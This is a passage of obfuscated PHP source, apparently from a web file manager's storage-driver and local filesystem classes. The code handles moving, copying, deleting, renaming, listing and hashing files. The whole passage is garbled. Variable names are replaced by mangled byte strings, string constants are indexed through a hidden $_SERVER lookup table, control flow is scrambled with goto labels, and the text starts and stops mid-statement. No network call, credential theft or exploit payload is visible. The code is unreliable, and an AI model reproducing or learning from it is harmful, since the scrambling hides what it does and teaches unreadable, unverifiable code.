ˆòŠ[2413]); show_json(LNG($eŞèÜ ˆòŠ[2414]), !1, $a”äÕ±òë); } goto D‰·ã·å¸; F§‰œˆÔš„: foreach ($cœ¼Ï·ã³Œ as $EÑéêÀ÷‡Ë => $BïŒßí„ŞÚ) { $cœ¼Ï·ã³Œ[$EÑéêÀ÷‡Ë] = trim($BïŒßí„ŞÚ); } $cœ¼Ï·ã³Œ[$eŞèÜ ˆòŠ[2411]] = rand_string(6); $Bó“¬£õåÙ = $GLOBALS[$eŞèÜ ˆòŠ[6]][$eŞèÜ ˆòŠ[84]][$eŞèÜ ˆòŠ[758]]; goto d¢™¤å×†; câÍğ‰…èŸ: $eŞèÜ ˆòŠ =& $_SERVER[…Ò×–]; $a‚Ï«œ×ÚÛ = strtolower($a”äÕ±òë[$eŞèÜ ˆòŠ[90]]); $cœ¼Ï·ã³Œ = json_decode($a”äÕ±òë[$eŞèÜ ˆòŠ[6]], !0); goto F§‰œˆÔš„; f°ŒÆ‘ôÀ: } public function driverListSystem() { $BÄÚğ–ˆÙÜ =& $_SERVER[…Ò×–]; $cÈ¾Ä˜øåÇ = parent::listData(); $BÕ¾èãéõ = array(); foreach ($cÈ¾Ä˜øåÇ as $C¹£†…îñ‚) { unset($C¹£†…îñ‚[$BÄÚğ–ˆÙÜ[191]], $C¹£†…îñ‚[$BÄÚğ–ˆÙÜ[107]]); $C¹£†…îñ‚[$BÄÚğ–ˆÙÜ[6]] = json_decode($C¹£†…îñ‚[$BÄÚğ–ˆÙÜ[6]], !0); $BÕ¾èãéõ[] = $C¹£†…îñ‚; } return $BÕ¾èãéõ; } public function defaultDriver() { $bÕ“¹‹…êÜ =& $_SERVER[…Ò×–]; $EãŠ§˜¡å = parent::listData(); $CÄ¦‰¶Ù©Ï = array_filter_by_field($EãŠ§˜¡å, $bÕ“¹‹…êÜ[34], 1); $CÄ¦‰¶Ù©Ï = $CÄ¦‰¶Ù©Ï[0]; if ($CÄ¦‰¶Ù©Ï) { $CÄ¦‰¶Ù©Ï[$bÕ“¹‹…êÜ[6]] = json_decode($CÄ¦‰¶Ù©Ï[$bÕ“¹‹…êÜ[6]], !0); } return $CÄ¦‰¶Ù©Ï; } public function driverInfo($f™“î¤°é) { $A¶Š¤¶½Ô« =& $_SERVER[…Ò×–]; $B›ÆöÔõÂã = array_to_keyvalue(parent::listData(), $A¶Š¤¶½Ô«[371]); if (!isset($B›ÆöÔõÂã[$f™“î¤°é])) { return !1; } $b¯¯ˆœöŠ¿ = $B›ÆöÔõÂã[$f™“î¤°é]; $b¯¯ˆœöŠ¿[$A¶Š¤¶½Ô«[6]] = json_decode($b¯¯ˆœöŠ¿[$A¶Š¤¶½Ô«[6]], !0); return $b¯¯ˆœöŠ¿; } public function remove($AÓ„Äçœƒ¡) { $this->removeShareItems($AÓ„Äçœƒ¡); return parent::remove($AÓ„Äçœƒ¡); } public function removeWithFile($C÷…¶Ò¹•ö, $e½ÈÛ¨ë) { goto F¾óÙ§°ùñ; dÄ²ñÇ»áÆ: if (!$fêÑÆ¹®»¾) { $E§Ë±ÀáŒ¢->stop($cİ§˜ÕĞ¾’); return !1; } $E§Ë±ÀáŒ¢->end(); if ($e½ÈÛ¨ë == $cì¶æÑšÁ[2085]) { $this->remove($C÷…¶Ò¹•ö); } goto E…ºÀ“ÑÉ„; F¾óÙ§°ùñ: $cì¶æÑšÁ =& $_SERVER[…Ò×–]; $F¯·Çùî‚Œ = array($cì¶æÑšÁ[748] => $C÷…¶Ò¹•ö); $Fğ¼¨—¥ºÀ = Model($cì¶æÑšÁ[426])->where($F¯·Çùî‚Œ)->count(); goto E†•„½Ú©¢; F¢ù¡Ğ©…: $Eéò¤¶Ñî = Model($cì¶æÑšÁ[171])->where($F¯·Çùî‚Œ)->field($cì¶æÑšÁ[2420])->select(); foreach ($Eéò¤¶Ñî as $a¿°ÊÏÊ¬) { goto eÇ„•—ÙÑ·; A¯Æ•êè: if (IO::exist($D•İøêÃ©—)) { $E§Ë±ÀáŒ¢->updateFileEnd($a¿°ÊÏÊ¬[$cì¶æÑšÁ[28]], $a¿°ÊÏÊ¬[$cì¶æÑšÁ[77]]); continue; } if (!IO::move($DßºÙÛíªÙ, get_path_father($D•İøêÃ©—))) { $fêÑÆ¹®»¾ = !1; break; } $F¯·Çùî‚Œ = array($cì¶æÑšÁ[423] => $a¿°ÊÏÊ¬[$cì¶æÑšÁ[423]]); goto f‚Ùí‘Â¡; eÇ„•—ÙÑ·: $DßºÙÛíªÙ = $a¿°ÊÏÊ¬[$cì¶æÑšÁ[75]]; $D•İøêÃ©— = $e•Œ°‹µó . str_replace("\173\x69\x6f\x3a{$C÷…¶Ò¹•ö}\175\x2f", $cì¶æÑšÁ[33], $DßºÙÛíªÙ); if (!IO::exist($DßºÙÛíªÙ)) { $cèõ¸—‡©è[] = $a¿°ÊÏÊ¬[$cì¶æÑšÁ[423]]; $E§Ë±ÀáŒ¢->updateFileEnd($a¿°ÊÏÊ¬[$cì¶æÑšÁ[28]], $a¿°ÊÏÊ¬[$cì¶æÑšÁ[77]]); continue; } goto A¯Æ•êè; f‚Ùí‘Â¡: $bµ£ƒ³‹“ = array($cì¶æÑšÁ[748] => $D„â¤á¿’º, $cì¶æÑšÁ[75] => $D•İøêÃ©—); Model($cì¶æÑšÁ[171])->where($F¯·Çùî‚Œ)->save($bµ£ƒ³‹“); goto Fåì£”âö¢; Fåì£”âö¢: } $this->removeByFileID($cèõ¸—‡©è); goto dÄ²ñÇ»áÆ; EŸÎá¿£ˆÈ: $e•Œ°‹µó = "\173\x69\x6f\x3a{$D„â¤á¿’º}\175\x2f"; $fêÑÆ¹®»¾ = !0; $cèõ¸—‡©è = array(); goto F¢ù¡Ğ©…; E†•„½Ú©¢: $aôÂÏßèÄ = Model($cì¶æÑšÁ[426])->where($F¯·Çùî‚Œ)->sum($cì¶æÑšÁ[77]); $cİ§˜ÕĞ¾’ = $e½ÈÛ¨ë . $cì¶æÑšÁ[2418] . $C÷…¶Ò¹•ö; $E§Ë±ÀáŒ¢ = new TaskFileTransfer($cİ§˜ÕĞ¾’, $cì¶æÑšÁ[2413], $Fğ¼¨—¥ºÀ, LNG($cì¶æÑšÁ[2419]) . "\x28{$C÷…¶Ò¹•ö}\51"); goto Cõ•Çõ×ï‘; Cõ•Çõ×ï‘: $E§Ë±ÀáŒ¢->task[$cì¶æÑšÁ[703]] = (double) $aôÂÏßèÄ; $DË©™×Ï»¨ = KodIO::defaultDriver(); $D„â¤á¿’º = $DË©™×Ï»¨[$cì¶æÑšÁ[371]]; goto EŸÎá¿£ˆÈ; E…ºÀ“ÑÉ„: } public function progress($e´ñÌğ¢Ã, $AÇÜø¤é–) { return Task::get($AÇÜø¤é– . $_SERVER[…Ò×–][2418] . $e´ñÌğ¢Ã); } private function removeByFileID($BÃ…Á‰ßíå = array()) { goto C»Œ¦÷ÓŸ÷; AïåÒùœà: foreach ($DŒå°÷»…¨ as $B»õÌ‘‰°) { Model($f«ƒÔöÀ˜«[386])->removeNow($B»õÌ‘‰°, !1); } goto EêªƒÂÔ¯’; C»Œ¦÷ÓŸ÷: $f«ƒÔöÀ˜« =& $_SERVER[…Ò×–]; if (empty($BÃ…Á‰ßíå)) { return; } $d´Ò‹´ìƒÁ = array($f«ƒÔöÀ˜«[423] => array($f«ƒÔöÀ˜«[7], $BÃ…Á‰ßíå)); goto eÂª‘ÎÚ­; eÂª‘ÎÚ­: $DŒå°÷»…¨ = Model($f«ƒÔöÀ˜«[1127])->where($d´Ò‹´ìƒÁ)->field($f«ƒÔöÀ˜«[373])->select(); if (!$DŒå°÷»…¨) { return; } $DŒå°÷»…¨ = array_to_keyvalue($DŒå°÷»…¨, $f«ƒÔöÀ˜«[33], $f«ƒÔöÀ˜«[373]); goto AïåÒùœà; EêªƒÂÔ¯’: } private function removeShareItems($A¢°é‘ïæ¼) { goto C¡â’ƒ”¯™; FƒË‘˜ÊÙŞ: Model($c×©®õ ´˜[540])->remove($bùŒ®÷œø); goto eÑ®ÈÜ³†å; C¡â’ƒ”¯™: $c×©®õ ´˜ =& $_SERVER[…Ò×–]; $Bœ³òƒğ = "\x7b\x69\x6f\72{$A¢°é‘ïæ¼}\x7d\57"; $Aîì…­ó²ì = array($c×©®õ ´˜[373] => 0, $c×©®õ ´˜[1030] => array($c×©®õ ´˜[756], "{$Bœ³òƒğ}\45")); goto aô„÷–œÌ¬; aô„÷–œÌ¬: $F²ØÕÍÀìÄ = Model($c×©®õ ´˜[2096])->where($Aîì…­ó²ì)->field($c×©®õ ´˜[444])->select(); if (empty($F²ØÕÍÀìÄ)) { return; } $bùŒ®÷œø = array_to_keyvalue($F²ØÕÍÀìÄ, $c×©®õ ´˜[33], $c×©®õ ´˜[444]); goto FƒË‘˜ÊÙŞ; eÑ®ÈÜ³†å: } } goto fî›Å÷†®Ñ; CëÈáÇîÆ´: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($a×ÊÚœì³) { if (substr($a×ÊÚœì³, 0, 2) == $_SERVER[…Ò×–][1168]) { $a×ÊÚœì³ = BASIC_PATH . substr($a×ÊÚœì³, 2); } return $a×ÊÚœì³; } public function iconvApp($eã™›ˆ¤à°) { $D·‘ë•‡½ =& $_SERVER[…Ò×–]; global $config; return $this->iconvTo($eã™›ˆ¤à°, $config[$D·‘ë•‡½[1166]], $config[$D·‘ë•‡½[1165]]); } public function iconvSystem($F÷Ë¯ê®Ğ¾) { $BÉßŒ×† =& $_SERVER[…Ò×–]; global $config; return $this->iconvTo($F÷Ë¯ê®Ğ¾, $config[$BÉßŒ×†[1165]], $config[$BÉßŒ×†[1166]]); } public function getPathOuter($Fé©öâŒÎñ) { goto då—ÂÍ„«; C´õ™™Úë÷: $Fé©öâŒÎñ = KodIO::clear($Fé©öâŒÎñ); $Fé©öâŒÎñ = substr($Fé©öâŒÎñ, strlen($fñ²äõ—³ˆ)); if (empty($this->pathDriver)) { return $Fé©öâŒÎñ; } goto A‘Ÿ…ÉÒè„; EÍ§§ÛÀëò: if (substr($fñ²äõ—³ˆ, 0, 2) == $B¡³ëË¤È [1168]) { $fñ²äõ—³ˆ = BASIC_PATH . substr($fñ²äõ—³ˆ, 2); } if (substr($Fé©öâŒÎñ, 0, 2) == $B¡³ëË¤È [1168]) { $Fé©öâŒÎñ = BASIC_PATH . substr($Fé©öâŒÎñ, 2); } $fñ²äõ—³ˆ = KodIO::clear($fñ²äõ—³ˆ); goto C´õ™™Úë÷; då—ÂÍ„«: $B¡³ëË¤È  =& $_SERVER[…Ò×–]; $fñ²äõ—³ˆ = $this->iconvApp($this->pathBase); $Fé©öâŒÎñ = $this->iconvApp($Fé©öâŒÎñ); goto EÍ§§ÛÀëò; A‘Ÿ…ÉÒè„: return $this->pathDriver . $B¡³ëË¤È [8] . ltrim($Fé©öâŒÎñ, $B¡³ëË¤È [8]); goto d”ªÑºÏ; d”ªÑºÏ: } public function mkfile($C´ÔºšÛˆ, $aàõ‹”Œì› = '', $dƒË¸ôİÒ¦ = REPEAT_RENAME) { $C´ÔºšÛˆ = $this->iconvSystem($C´ÔºšÛˆ); @touch($C´ÔºšÛˆ); if ($aàõ‹”Œì›) { file_put_contents($C´ÔºšÛˆ, $aàõ‹”Œì›); } return is_file($C´ÔºšÛˆ) ? $this->getPathOuter($C´ÔºšÛˆ) : !1; } public function mkdir($cÇ¥Ø¯ïª¿, $Cˆª×ß¤ŸÑ = REPEAT_SKIP) { $cÇ¥Ø¯ïª¿ = $this->iconvSystem($cÇ¥Ø¯ïª¿); if (is_dir($cÇ¥Ø¯ïª¿)) { return $this->getPathOuter($cÇ¥Ø¯ïª¿); } @mkdir($cÇ¥Ø¯ïª¿, 511, !0); return is_dir($cÇ¥Ø¯ïª¿) ? $this->getPathOuter($cÇ¥Ø¯ïª¿) : !1; } public function copyFile($c×Èµ‘ªáÜ, $BÀ¥Ä ªö ) { $this->mkdir($this->pathFather($BÀ¥Ä ªö )); $c×Èµ‘ªáÜ = $this->iconvSystem($c×Èµ‘ªáÜ); $BÀ¥Ä ªö  = $this->iconvSystem($BÀ¥Ä ªö ); $DÜÖ¡ĞóŒ– = copy_64($c×Èµ‘ªáÜ, $BÀ¥Ä ªö ); return $DÜÖ¡ĞóŒ– ? $this->getPathOuter($BÀ¥Ä ªö ) : !1; } public function moveFile($FÜƒ²Ì®¶ç, $bÓáñ†Ÿô) { $this->mkdir($this->pathFather($bÓáñ†Ÿô)); $FÜƒ²Ì®¶ç = $this->iconvSystem($FÜƒ²Ì®¶ç); $bÓáñ†Ÿô = $this->iconvSystem($bÓáñ†Ÿô); $C÷‡·Ñ¼ßÅ = intval(@rename($FÜƒ²Ì®¶ç, $bÓáñ†Ÿô)); if (!$C÷‡·Ñ¼ßÅ) { if ($C÷‡·Ñ¼ßÅ = intval(@copy_64($FÜƒ²Ì®¶ç, $bÓáñ†Ÿô))) { @unlink($FÜƒ²Ì®¶ç); } } return $C÷‡·Ñ¼ßÅ ? $this->getPathOuter($bÓáñ†Ÿô) : !1; } public function delFile($c·­×ê¸Ñ) { $c·­×ê¸Ñ = $this->iconvSystem($c·­×ê¸Ñ); if (!@unlink($c·­×ê¸Ñ)) { @chmod($c·­×ê¸Ñ, 511); if (!@unlink($c·­×ê¸Ñ)) { return !1; } } else { return !0; } } public function delFolder($e÷Â·Û²Ó×) { goto Bµâ¿Ôî²ä; cÔó Œ´ŠØ: if (!($Bè”òèâÔ = opendir($e÷Â·Û²Ó×))) { return !1; } while (($C°ÂÄ¦Ç¢ã = readdir($Bè”òèâÔ)) !== !1) { if ($C°ÂÄ¦Ç¢ã == $AÜÆÃêŠÙÂ[91] || $C°ÂÄ¦Ç¢ã == $AÜÆÃêŠÙÂ[1178]) { continue; } $A“ÜÍâ¾—¥ = $e÷Â·Û²Ó× . $AÜÆÃêŠÙÂ[8] . $C°ÂÄ¦Ç¢ã; if (is_file($A“ÜÍâ¾—¥) || is_link($A“ÜÍâ¾—¥)) { if (!unlink($A“ÜÍâ¾—¥)) { chmod($A“ÜÍâ¾—¥, 511); if (!unlink($A“ÜÍâ¾—¥)) { return !1; } } } else { if (is_dir($A“ÜÍâ¾—¥)) { chmod($A“ÜÍâ¾—¥, 511); $A“ÜÍâ¾—¥ = $this->iconvApp($A“ÜÍâ¾—¥); if (!$this->delFolder($A“ÜÍâ¾—¥)) { return !1; } } } } closedir($Bè”òèâÔ); goto däÅê‰‘³; Bµâ¿Ôî²ä: $AÜÆÃêŠÙÂ =& $_SERVER[…Ò×–]; $e÷Â·Û²Ó× = $this->iconvSystem($e÷Â·Û²Ó×); if (!is_dir($e÷Â·Û²Ó×)) { return !0; } goto cÔó Œ´ŠØ; däÅê‰‘³: return rmdir($e÷Â·Û²Ó×); goto B¨È¿òÇŸ; B¨È¿òÇŸ: } public function rename($EŞ––Âù¨, $B¤©†–ìâñ) { goto Få—»ÓÛ®; D«·‰æ‰“: $EŞ––Âù¨ = $this->iconvSystem($EŞ––Âù¨); $AÊÒ‚‘ ÕÈ = $this->pathFather($EŞ––Âù¨); $FßÙ‚¶´Š„ = rtrim($AÊÒ‚‘ ÕÈ, $aÄò”İèÔÉ[8]) . $aÄò”İèÔÉ[8] . $CÇ°Üò‚ä; goto f‘ø’™Û¡Ë; f‘ø’™Û¡Ë: $d¤ÚÒØó¯ = @rename($EŞ––Âù¨, $FßÙ‚¶´Š„); $FßÙ‚¶´Š„ = $this->iconvApp($FßÙ‚¶´Š„); return $d¤ÚÒØó¯ ? $this->getPathOuter($FßÙ‚¶´Š„) : !1; goto AÉ•»é¶™»; Få—»ÓÛ®: $aÄò”İèÔÉ =& $_SERVER[…Ò×–]; $CÇ°Üò‚ä = $this->fileNameAuto($this->pathFather($EŞ––Âù¨), $B¤©†–ìâñ); $CÇ°Üò‚ä = $this->iconvSystem($CÇ°Üò‚ä); goto D«·‰æ‰“; AÉ•»é¶™»: } public function size($A¯§İŞ¨®é) { $A¯§İŞ¨®é = $this->iconvSystem($A¯§İŞ¨®é); return filesize_64($A¯§İŞ¨®é); } public function info($c¦’ì›’ˆ¹) { $c¦’ì›’ˆ¹ = $this->iconvSystem($c¦’ì›’ˆ¹); if ($this->isFolder($c¦’ì›’ˆ¹)) { return $this->folderInfo($c¦’ì›’ˆ¹); } else { if ($this->isFile($c¦’ì›’ˆ¹)) { return $this->fileInfo($c¦’ì›’ˆ¹); } } return !1; } protected function infoChildren($A½‘È”õÌë, &$F¨ã‹©œ„Â, $a–ƒ«£èøõ = true) { goto B¯¦‚­Ô‚ø; a‹É•‰Ö·: closedir($d‡Ç“À¿¬µ); goto eÀ ÍŒ½ÒŠ; c¤‚¿Ëœ¼Ø: if ($a–ƒ«£èøõ) { $A½‘È”õÌë = $this->iconvSystem($A½‘È”õÌë); } if (!($d‡Ç“À¿¬µ = @opendir($A½‘È”õÌë))) { return; } while (($B¡Û•åÖ¶Õ = readdir($d‡Ç“À¿¬µ)) !== !1) { if ($B¡Û•åÖ¶Õ == $C†œì„ˆô‘[91] || $B¡Û•åÖ¶Õ == $C†œì„ˆô‘[1178]) { continue; } $dÁİ¿Õîî = $A½‘È”õÌë . $B¡Û•åÖ¶Õ; if (is_file($dÁİ¿Õîî) || is_link($dÁİ¿Õîî)) { $F¨ã‹©œ„Â[$C†œì„ˆô‘[78]]++; $F¨ã‹©œ„Â[$C†œì„ˆô‘[77]] += filesize_64($dÁİ¿Õîî); } else { if (is_dir($dÁİ¿Õîî)) { $F¨ã‹©œ„Â[$C†œì„ˆô‘[79]]++; $this->infoChildren($dÁİ¿Õîî, $F¨ã‹©œ„Â, !1); } } } goto a‹É•‰Ö·; B¯¦‚­Ô‚ø: $C†œì„ˆô‘ =& $_SERVER[…Ò×–]; check_abort(); $A½‘È”õÌë = rtrim($A½‘È”õÌë, $C†œì„ˆô‘[8]) . $C†œì„ˆô‘[8]; goto c¤‚¿Ëœ¼Ø; eÀ ÍŒ½ÒŠ: } private function folderInfo($BŠÏ¸‹Â¹ƒ, $a³ÁÙŸ‹š = false) { $Bô¾„´õÅ† =& $_SERVER[…Ò×–]; $BŠÏ¸‹Â¹ƒ = rtrim($BŠÏ¸‹Â¹ƒ, $Bô¾„´õÅ†[8]) . $Bô¾„´õÅ†[8]; $dÅË…„Å–¤ = $this->iconvApp($this->pathThis($BŠÏ¸‹Â¹ƒ)); if ($a³ÁÙŸ‹š) { return array($Bô¾„´õÅ†[28] => $dÅË…„Å–¤, $Bô¾„´õÅ†[75] => $this->getPathOuter($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[29] => $Bô¾„´õÅ†[76]); } $E…„ìŞ“† = array($Bô¾„´õÅ†[28] => $dÅË…„Å–¤, $Bô¾„´õÅ†[75] => $this->getPathOuter($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[29] => $Bô¾„´õÅ†[76], $Bô¾„´õÅ†[191] => @filectime($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[107] => @filemtime($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[1180] => @fileatime($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[1175] => is_readable($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[1176] => is_writable($BŠÏ¸‹Â¹ƒ), $Bô¾„´õÅ†[1181] => get_mode($BŠÏ¸‹Â¹ƒ)); return $E…„ìŞ“†; } private function fileInfo($EÁóë®ÔçÆ, $c°½†ÜÂ Ë = false) { $dÛ Ÿˆé‘± =& $_SERVER[…Ò×–]; $a¬‰˜Íô„« = $this->iconvApp($this->pathThis($EÁóë®ÔçÆ)); if ($c°½†ÜÂ Ë) { return array($dÛ Ÿˆé‘±[28] => $a¬‰˜Íô„«, $dÛ Ÿˆé‘±[75] => $this->getPathOuter($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[29] => $dÛ Ÿˆé‘±[171], $dÛ Ÿˆé‘±[77] => $this->size($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[165] => $this->ext($a¬‰˜Íô„«)); } $Fâ¶îÕÔ¥Ä = array($dÛ Ÿˆé‘±[28] => $a¬‰˜Íô„«, $dÛ Ÿˆé‘±[75] => $this->getPathOuter($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[29] => $dÛ Ÿˆé‘±[171], $dÛ Ÿˆé‘±[191] => @filectime($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[107] => @filemtime($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[1180] => @fileatime($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[77] => $this->size($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[165] => $this->ext($a¬‰˜Íô„«), $dÛ Ÿˆé‘±[1175] => is_readable($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[1176] => is_writable($EÁóë®ÔçÆ), $dÛ Ÿˆé‘±[1181] => get_mode($EÁóë®ÔçÆ)); return $Fâ¶îÕÔ¥Ä; } public function exist($DóÛ¼ÅÓ¸) { $DóÛ¼ÅÓ¸ = $this->iconvSystem($DóÛ¼ÅÓ¸); return @file_exists($DóÛ¼ÅÓ¸); } public function isFile($A‰ÆŒÌÈ³º) { $A‰ÆŒÌÈ³º = $this->iconvSystem($A‰ÆŒÌÈ³º); return @is_file($A‰ÆŒÌÈ³º); } public function isFolder($DÃµ…›Š×) { $DÃµ…›Š× = $this->iconvSystem($DÃµ…›Š×); return @is_dir($DÃµ…›Š×); } public function listPath($Dé‹É™•ê, $dğİƒŸëõ = false) { goto D¼…¾±¬ÊÕ; D¼…¾±¬ÊÕ: $DŠš·œ´Ğ° =& $_SERVER[…Ò×–]; $Dé‹É™•ê = $this->iconvSystem($Dé‹É™•ê); $Dé‹É™•ê = rtrim($Dé‹É™•ê, $DŠš·œ´Ğ°[8]) . $DŠš·œ´Ğ°[8]; goto aÚèòÕÓ¼; aÚèòÕÓ¼: $aÖ±Ì®Ö§ = array($DŠš·œ´Ğ°[74] => array(), $DŠš·œ´Ğ°[73] => array()); if (!($DŠ†°çµŸ = @opendir($Dé‹É™•ê))) { return $aÖ±Ì®Ö§; } while (($b£¬©µš = readdir($DŠ†°çµŸ)) !== !1) { if ($b£¬©µš == $DŠš·œ´Ğ°[91] || $b£¬©µš == $DŠš·œ´Ğ°[1178]) { continue; } $F‰’ÜŸš²Ï = $Dé‹É™•ê . $b£¬©µš; if (is_file($F‰’ÜŸš²Ï)) { $aÖ±Ì®Ö§[$DŠš·œ´Ğ°[73]][] = $this->fileInfo($F‰’ÜŸš²Ï, $dğİƒŸëõ); } else { $aÖ±Ì®Ö§[$DŠš·œ´Ğ°[74]][] = $this->folderInfo($F‰’ÜŸš²Ï, $dğİƒŸëõ); } } goto EÎĞõ©‰½º; EÎĞõ©‰½º: closedir($DŠ†°çµŸ); return $aÖ±Ì®Ö§; goto a¹²ÏóÇ°; a¹²ÏóÇ°: } public function listAll($B¼Õ¯–‰Ş, &$Cê§ƒ¨®âŒ = array()) { goto cî‘Ûæµ…; eÖˆµ¶÷: if (!($eÊË„¨›Ï = @opendir($B¼Õ¯–‰Ş))) { return $Cê§ƒ¨®âŒ; } while (($a¬³›ëÂõ› = readdir($eÊË„¨›Ï)) !== !1) { if ($a¬³›ëÂõ› == $F¾Ö±ˆ»‚[91] || $a¬³›ëÂõ› == $F¾Ö±ˆ»‚[1178]) { continue; } $fîÀóãø²Š = $B¼Õ¯–‰Ş . $a¬³›ëÂõ›; if (is_dir($fîÀóãø²Š) && !is_link($fîÀóãø²Š)) { $Cê§ƒ¨®âŒ[] = array($F¾Ö±ˆ»‚[75] => $fîÀóãø²Š . $F¾Ö±ˆ»‚[8], $F¾Ö±ˆ»‚[76] => 1, $F¾Ö±ˆ»‚[107] => @filemtime($fîÀóãø²Š), $F¾Ö±ˆ»‚[77] => 0); $this->listAll($fîÀóãø²Š, $Cê§ƒ¨®âŒ); } else { $Cê§ƒ¨®âŒ[] = array($F¾Ö±ˆ»‚[75] => $fîÀóãø²Š, $F¾Ö±ˆ»‚[76] => 0, $F¾Ö±ˆ»‚[107] => @filemtime($fîÀóãø²Š), $F¾Ö±ˆ»‚[77] => $this->size($fîÀóãø²Š)); } } closedir($eÊË„¨›Ï); goto BÇñÊ­¼æ©; BÇñÊ­¼æ©: return $Cê§ƒ¨®âŒ; goto F£Ö‘¹âáØ; cî‘Ûæµ…: $F¾Ö±ˆ»‚ =& $_SERVER[…Ò×–]; $B¼Õ¯–‰Ş = $this->iconvSystem($B¼Õ¯–‰Ş); $B¼Õ¯–‰Ş = rtrim($B¼Õ¯–‰Ş, $F¾Ö±ˆ»‚[8]) . $F¾Ö±ˆ»‚[8]; goto eÖˆµ¶÷; F£Ö‘¹âáØ: } public function has($d–ñÇŒĞÂÑ, $Bš‚ÅèÀœ« = false, $d»Ã§ÆŠñ³ = true) { goto EÄ»¼¿‘Ï½; f–Ë¾Ñß‘: if ($Bš‚ÅèÀœ«) { return array($e··Ñ–ø­Ä[195] => $bÑ¢ÚÁ¸÷, $e··Ñ–ø­Ä[196] => $BÌ±„»æéÜ); } return !1; goto B°ê°ãš†; d¶¦õ ïæÈ: $A¢êğß‚¦› = 0; while (($EÆˆâÆ¡äÍ = readdir($Eò…¹«Ó­Ë)) !== !1) { if ($EÆˆâÆ¡äÍ == $e··Ñ–ø­Ä[91] || $EÆˆâÆ¡äÍ == $e··Ñ–ø­Ä[1178]) { continue; } $eØÒ£¼­òá = $d–ñÇŒĞÂÑ . $EÆˆâÆ¡äÍ; if ($Bš‚ÅèÀœ«) { $A¢êğß‚¦›++; if (@is_file($eØÒ£¼­òá)) { $bÑ¢ÚÁ¸÷++; } else { $BÌ±„»æéÜ++; } if ($A¢êğß‚¦› > 10000) { break; } continue; } if ($d»Ã§ÆŠñ³) { if (@is_file($eØÒ£¼­òá)) { return !0; } } else { if (@is_dir($eØÒ£¼­òá . $e··Ñ–ø­Ä[8])) { return !0; } } } closedir($Eò…¹«Ó­Ë); goto f–Ë¾Ñß‘; EÄ»¼¿‘Ï½: $e··Ñ–ø­Ä =& $_SERVER[…Ò×–]; $d–ñÇŒĞÂÑ = $this->iconvSystem($d–ñÇŒĞÂÑ); $d–ñÇŒĞÂÑ = rtrim($d–ñÇŒĞÂÑ, $e··Ñ–ø­Ä[8]) . $e··Ñ–ø­Ä[8]; goto BİÅŒŠÆ¡ƒ; BİÅŒŠÆ¡ƒ: if (!($Eò…¹«Ó­Ë = @opendir($d–ñÇŒĞÂÑ))) { return !1; } $bÑ¢ÚÁ¸÷ = 0; $BÌ±„»æéÜ = 0; goto d¶¦õ ïæÈ; B°ê°ãš†: } public function hashSimple($dîÀ‹Öğø) { goto a‹”¯ŞÉ§ˆ; E°™ïáÎŒ¥: fseek_64($AôŠ©ŞøÒ“, $bĞÍß†·Û - $b¶¬÷‹…‰Ÿ); $E…ÑÊÉƒ† .= fread($AôŠ©ŞøÒ“, $b¶¬÷‹…‰Ÿ); fclose($AôŠ©ŞøÒ“); goto Dë•İŞÃƒ; Dë•İŞÃƒ: return md5($E…ÑÊÉƒ†) . $bĞÍß†·Û; goto C«š¡Âƒ¥ñ; E¸âïÉÁš‹: if ($bĞÍß†·Û <= $b¶¬÷‹…‰Ÿ * $aÙÀÇ«íò·) { return $this->hashMd5($dîÀ‹Öğø) . $bĞÍß†·Û; } $E…ÑÊÉƒ† = $D¶óİ²‰Œ[33]; $d®»Ş«…‰è = intval($bĞÍß†·Û / $aÙÀÇ«íò·); goto cëª£ë´ÕÕ; A¦Ó›ÓÃàö: $bĞÍß†·Û = $this->size($dîÀ‹Öğø); $b¶¬÷‹…‰Ÿ = 200; $aÙÀÇ«íò· = 50; goto E¸âïÉÁš‹; cëª£ë´ÕÕ: $AôŠ©ŞøÒ“ = fopen($dîÀ‹Öğø, $D¶óİ²‰Œ[1182]); if (!$AôŠ©ŞøÒ“) { return $E…ÑÊÉƒ†; } for ($c°¿—‘‰àó = 0; $c°¿—‘‰àó < $aÙÀÇ«íò·; $c°¿—‘‰àó++) { fseek_64($AôŠ©ŞøÒ“, $d®»Ş«…‰è * $c°¿—‘‰àó); $E…ÑÊÉƒ† .= fread($AôŠ©ŞøÒ“, $b¶¬÷‹…‰Ÿ); } goto E°™ïáÎŒ¥; a‹”¯ŞÉ§ˆ: $D¶óİ²‰Œ =& $_SERVER[…Ò×–]; if (!$dîÀ‹Öğø) { return md5($D¶óİ²‰Œ[33]); } $dîÀ‹Öğø = $this->iconvSystem($dîÀ‹Öğø); goto A¦Ó›ÓÃàö; C«š¡Âƒ¥ñ: } public function getContent($a­ÅÖÖ­¡·) { $a­ÅÖÖ­¡· = $this->iconvSystem($a­ÅÖÖ­¡·); return file_get_contents($a­ÅÖÖ­¡·); } public function setContent($c±¹¤İ«£à, $eÌê²ëáäŒ = '') { $c±¹¤İ«£à = $this->iconvSystem($c±¹¤İ«£à); @file_put_contents($c±¹¤İ«£à, $eÌê²ëáäŒ, LOCK_EX); clearstatcache(); return strlen($eÌê²ëáäŒ) == filesize_64($c±¹¤İ«£à); } public function fileSubstr($fã§¡šÀê, $fÅÙìÌÙ²ç = 0, $aÓéœÀìÒ = false) { goto e°¶ƒŒÖ‡; B¢¥ÓãÔºÀ: return $B—ñˆÁËÈ„; goto A³·«º–ÛÊ; fÕ›ßÈ´¸Ì: if ($aÓéœÀìÒ <= 0) { return $AÓ–¶Ìš‘[33]; } $CÊØˆäî Â = fopen($fã§¡šÀê, $AÓ–¶Ìš‘[1182]); if (!$CÊØˆäî Â) { return !1; } goto f³„âØÅÛÂ; f³„âØÅÛÂ: fseek_64($CÊØˆäî Â, $fÅÙìÌÙ²ç); $B—ñˆÁËÈ„ = fread($CÊØˆäî Â, $aÓéœÀìÒ); 